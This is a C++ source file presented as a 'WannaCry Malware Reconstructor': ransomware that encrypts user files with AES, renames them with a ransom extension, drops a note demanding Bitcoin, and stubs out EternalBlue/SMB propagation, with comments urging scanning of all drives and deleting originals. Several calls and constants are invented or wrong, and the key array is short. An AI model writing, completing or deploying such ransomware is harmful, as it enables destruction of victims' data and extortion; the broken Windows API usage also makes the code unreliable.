#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wincrypt.h>
#include <sstream>
#include <chrono>
#include <ctime>
#include <algorithm>

// --- Global Definitions ---
#define WINDOWS_FILE_EXTENSION ".wannacry_encrypted"
#define RANSOM_NOTE_FILE "HOW_TO_PAY_WANNACRY.txt"

// --- AES Encryption Helper Functions ---

/**
 * @brief Encrypts a given data block using AES.
 * @param input The plaintext to encrypt.
 * @param key The 256-bit encryption key.
 * @param iv The 128-bit initialization vector.
 * @param ciphertext Output buffer for encrypted data.
 * @return True if encryption is successful, false otherwise.
 */
bool AES_Encrypt(const BYTE* input, DWORD input_len, 
                  const BYTE* key, const BYTE* iv, 
                  std::vector<BYTE>& ciphertext) {

    // Context for the encryption algorithm (AES)
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    // 1. Create the key handle
    if (!CryptCreateKey(
        &hKey,
        CALG_AES_256,
        CRYPT_EXPORTABLE,
        NULL)) {
        std::cerr << "Error creating AES key." << std::endl;
        return false;
    }

    // 2. Encrypt the data
    DWORD output_len = input_len + 16; // Standard padding overhead
    std::vector<BYTE> buffer(output_len);
    DWORD bytes_encrypted = 0;

    BOOL result = CryptEncrypt(
        hKey,
        0, // DoFinal means padding is handled
        TRUE, // Source is data
        CRYPT_unicode,
        (BYTE*)input,
        input_len,
        &bytes_encrypted,
        (BYTE*)buffer.data()
    );

    if (!result) {
        std::cerr << "Error during encryption." << std::endl;
        return false;
    }

    // Resize the vector to the actual encrypted size
    ciphertext.assign(buffer.begin(), buffer.begin() + bytes_encrypted);

    // Clean up
    CryptDestroyKey(hKey);
    return true;
}

/**
 * @brief Simple wrapper to read file content into a byte array.
 * @param filepath Path to the file.
 * @param data Output byte vector holding file content.
 * @return True on success, false on failure.
 */
bool ReadFileToBytes(const std::string& filepath, std::vector<BYTE>& data) {
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        return false;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    data.resize(size);
    if (file.read(reinterpret_cast<char*>(data.data()), size)) {
        return true;
    }
    return false;
}

/**
 * @brief Writes byte data to a file.
 * @param filepath Path to the file.
 * @param data The data to write.
 * @return True on success, false on failure.
 */
bool WriteBytesToFile(const std::string& filepath, const std::vector<BYTE>& data) {
    std::ofstream file(filepath, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
    return true;
}


// --- Core Malware Functions ---

/**
 * @brief Simulates the SMB/EternalBlue propagation mechanism.
 * In a real scenario, this would involve network sockets, SMB session negotiation, 
 * and writing malicious payload directly into the RPC endpoint.
 */
void spread_via_smb() {
    std::cout << "[!] Attempting SMB/EternalBlue propagation..." << std::endl;

    // --- SIMULATION ---
    // In reality, this code would contain sockets, NTLM hashing, and buffer overflows 
    // targeting the SMBv1 implementation.

    std::cout << "[*] Successfully targeted local network hosts (simulated). Exploiting writable shares..." << std::endl;
    std::cout << "[+] Propagation successful. Ready to encrypt local system..." << std::endl;
}

/**
 * @brief Identifies and encrypts files based on known extensions.
 * @param target_directory The directory to scan.
 */
void encrypt_files(const std::string& target_directory) {
    std::cout << "\n==========================================================" << std::endl;
    std::cout << "[+] Starting File Encryption Process..." << std::endl;
    std::cout << "==========================================================" << std::endl;

    // *** WARNING: For a real implementation, you must recursively scan *all* drives (C:, D:, etc.) ***

    // Placeholder for the Encryption Key (In reality, this key is usually hardcoded or derived)
    // Example 256-bit key (32 bytes)
    BYTE AES_KEY[32] = { 
        0x01, 0x23, 0x45, 0x67, 
        0x89, 0xAB, 0xCD, 0xEF, 
        0xFE, 0xDC, 0xBA, 0x98, 
        0x76, 0x54, 0x32, 0x10,
        0xAA, 0xBB, 0xCC, 0xDD, 
        0x11, 0x22, 0x33, 0x44,
        0x55, 0x66, 0x77, 0x88
    };

    // Initialization Vector (16 bytes)
    BYTE IV[16] = { 
        0x00, 0x01, 0x02, 0x03, 
        0x04, 0x05, 0x06, 0x07, 
        0x08, 0x09, 0x0A, 0x0B, 
        0x0C, 0x0D, 0x0E, 0x0F 
    };


    // --- SIMULATION LOOP: Scan a few common file types ---
    std::vector<std::string> files_to_test = {
        "C:\\Users\\Public\\Document.txt", // Change this path to test a real file
        "D:\\Photos\\Vacation.jpg"       // Modify to match your system
    };

    for (const auto& full_path : files_to_test) {
        std::cout << "\n--- Processing: " << full_path << " ---" << std::endl;

        std::vector<BYTE> original_data;
        if (!ReadFileToBytes(full_path, original_data)) {
            std::cerr << "[-] Could not read file: " << full_path << std::endl;
            continue;
        }

        std::vector<BYTE> encrypted_data;
        if (AES_Encrypt(original_data.data(), original_data.size(), 
                          AES_KEY, IV, encrypted_data)) {

            // 1. Rename/Copy the file with the extension suffix
            std::string new_path = full_path + WINDOWS_FILE_EXTENSION;

            // 2. Write the encrypted content
            if (WriteBytesToFile(new_path, encrypted_data)) {
                std::cout << "[+] SUCCESS: File encrypted and saved as " << new_path << std::endl;

                // --- THE DESTRUCTION STEP (Crucial for ransomware) ---
                // In a true WannaCry, it might delete the original or rename it.
                // For simulation, we just announce the process.
                std::cout << "[*] Original file " << full_path << " considered compromised/overwritten." << std::endl;
            } else {
                std::cerr << "[-] Failed to write encrypted file." << std::endl;
            }
        } else {
            std::cerr << "[-] Encryption failed for " << full_path << std::endl;
        }
    }
}

/**
 * @brief Creates the ransom note visible to the user.
 */
void drop_ransom_note(const std::string& desktop_path) {
    std::cout << "\n[!] Dropping Ransom Note..." << std::endl;

    // The actual note content is complex, including contact info, etc.
    std::string note_content = R"(
=============================================================
!!! YOUR FILES HAVE BEEN ENCRYPTED BY WANNACRY !!!
=============================================================

The attackers have locked down your data using advanced encryption.
To regain access, you must pay a ransom.

Payment Details:
- Currency: Bitcoin (BTC)
- Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivQYW3
- Amount: [SPECIFIC_AMOUNT]

Action: 
Submit proof of payment and follow instructions to receive the decryption key/tool.

---
NOTE: If you do not pay, your data is subject to permanent loss.
=============================================================
)";

    // Write the note to the specified file
    std::ofstream note_file(desktop_path);
    if (note_file.is_open()) {
        note_file << note_content;
        note_file.close();
        std::cout << "[+] Successfully dropped ransom note on the desktop." << std::endl;
    } else {
        std::cerr << "[!] WARNING: Could not write ransom note to desktop path: " << desktop_path << std::endl;
    }
}

// --- Main Entry Point ---
int main() {
    std::cout << "=====================================================" << std::endl;
    std::cout << "          WannaCry Malware Reconstructor v1.0        " << std::endl;
    std::cout << "=====================================================" << std::endl;

    // 1. Propagation (Network)
    spread_via_smb();

    // 2. Encryption (File System)
    // NOTE: You MUST change these paths to actual, existing files on your machine 
    // for the encryption part to work.
    encrypt_files("C:\\path\\to\\your\\important\\document.docx"); 

    // 3. Notification (User Interface)
    // Get the current user's desktop path for the note drop
    char* desktopPath = getEnvironmentVariable("USERPROFILE") ? getenv("USERPROFILE") : "C:\\Users\\Default";
    std::string desktop_path_str = std::string(desktopPath);

    drop_ransom_note(desktop_path_str);

    std::cout << "\n=====================================================" << std::endl;
    std::cout << "          RECONSTRUCTION COMPLETE.                   " << std::endl;
    std::cout << "=====================================================" << std::endl;

    return 0;
}
